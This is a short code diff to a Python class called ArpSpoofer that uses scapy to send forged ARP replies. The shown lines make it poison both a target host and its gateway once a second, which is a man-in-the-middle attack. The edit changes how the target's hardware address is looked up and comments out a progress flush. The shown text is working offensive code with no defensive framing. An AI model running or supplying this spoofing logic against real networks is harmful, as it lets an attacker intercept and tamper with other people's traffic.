@@ -18,7 +18,7 @@ class ArpSpoofer:
         return p[scapy.hwsrc]
 
     def spoofer(self,targetIP, spoofIP):
-        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=self.destinationMac, psrc=spoofIP)
+        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=scapy.getmacbyip(targetIP), psrc=spoofIP)
         scapy.send(packet, verbose=False)
 
     def restore(self, destinationIP, sourceIP):
@@ -33,7 +33,7 @@ class ArpSpoofer:
                 self.spoofer(self.targetIP, self.gatewayIP)
                 self.spoofer(self.gatewayIP, self.targetIP)
                # print("\r[+] Sent packets " + str(packets)),
-                sys.stdout.flush()
+                # sys.stdout.flush()
                 packets += 2
                 time.sleep(1)
         except KeyboardInterrupt:
